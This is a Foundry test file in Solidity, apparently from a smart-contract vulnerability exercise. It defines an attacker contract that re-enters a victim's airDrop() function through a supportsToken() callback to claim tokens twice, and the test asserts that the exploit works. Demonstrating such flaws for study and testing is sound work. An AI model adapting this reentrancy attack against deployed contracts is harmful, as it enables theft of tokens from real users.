
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ModifierEntrancy, Bank, attack} from "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    ModifierEntrancy public _contractUnderTest;
    AttackerContract public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();
        _attacker = new AttackerContract(address(_contractUnderTest));
    }

    function test_attackerCallsAirDropMultipleTimes() public {
        // Capture initial balance
        uint256 initialBalance = _contractUnderTest.tokenBalance(address(_attacker));
        assertEq(initialBalance, 0, "Initial balance should be 0");

        // Trigger the attack
        _attacker.attack();

        // Verify the exploit succeeded
        // If reentrancy worked, the attacker should have more than 20 tokens
        // (20 from first call + 20 from reentrant call = 40)
        uint256 finalBalance = _contractUnderTest.tokenBalance(address(_attacker));
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        assertGt(finalBalance, 20, "Attacker should have more than 20 tokens due to reentrancy");
        assertEq(finalBalance, 40, "Attacker should have exactly 40 tokens (2 x 20)");
    }

    receive() external payable {}
}

contract AttackerContract {
    ModifierEntrancy public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    bool private _reentering;

    constructor(address victimAddress) { 
        _victim = ModifierEntrancy(victimAddress);
    }

    function attack() public {
        attackCallCount = 0;
        exploitSucceeded = false;
        _reentering = false;
        
        // Call the vulnerable airDrop function
        _victim.airDrop();
        
        // Check if reentrancy was successful
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    // This function is called by the supportsToken modifier in ModifierEntrancy
    function supportsToken() external returns (bytes32) {
        attackCallCount++;
        
        // Perform reentrancy on the first call
        // The vulnerability is that supportsToken modifier makes an external call
        // BEFORE the hasNoBalance check is fully enforced (state not yet updated)
        if (!_reentering && attackCallCount == 1) {
            _reentering = true;
            // Re-enter airDrop - at this point tokenBalance[msg.sender] is still 0
            // because the += 20 hasn't executed yet
            _victim.airDrop();
        }
        
        return keccak256(abi.encodePacked("Nu Token"));
    }

    receive() external payable {}
}
